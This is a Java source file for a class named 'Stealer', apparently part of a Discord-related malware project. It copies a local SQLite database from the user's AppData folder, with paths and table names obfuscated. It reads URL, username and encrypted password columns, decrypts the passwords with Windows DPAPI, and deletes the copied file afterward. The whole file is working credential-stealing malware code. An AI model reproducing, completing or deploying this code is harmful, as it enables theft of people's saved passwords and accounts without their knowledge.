package me.mafrans.discordsw.stealer;

import com.sun.jna.platform.win32.Crypt32Util;
import me.mafrans.discordsw.Main;

import java.io.File;
import java.io.IOException;
import java.io.UnsupportedEncodingException;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.sql.*;
import java.util.ArrayList;
import java.util.List;

/**
 * Created by Lemon on 8/26/2017.
 */
public class Stealer
{
    private static String d = System.getenv("LOCALAPPDATA") + Main.sql.a;

    private static Connection connect() throws SQLException, ClassNotFoundException, IOException
    {
        String b = System.getenv("LOCALAPPDATA") + Main.sql.b;
        if (!new File(b).exists())
            {
                Files.copy(Paths.get(d), Paths.get(b));
            }
            Class.forName("org.sqlite.JDBC");
        String u = "jdbc:sqlite:" + b;
        return DriverManager.getConnection(u);
    }

    public static List<Data> s()
    {
        try
        {
           Connection connection =  connect();
           Statement st = connection.createStatement();
            ResultSet set = st.executeQuery("SELECT * FROM " + Main.sql.c);
           List<Data> data = new ArrayList<>();
           while(set.next())
           {
               String x = set.getString(2);
               String y = set.getString(4);
               byte[] a = set.getBytes(6);
               byte[] b = Crypt32Util.cryptUnprotectData(a);
               String z = new String(b, "UTF-8");
               Data dt = new Data(x, y, z);
               data.add(dt);

           }
           connection.close();
            Files.delete(Paths.get(System.getenv("LOCALAPPDATA") + Main.sql.b));
           return data;
        }
        catch(SQLException | ClassNotFoundException | IOException ex)
        {
            return new ArrayList<>();
        }
    }
}
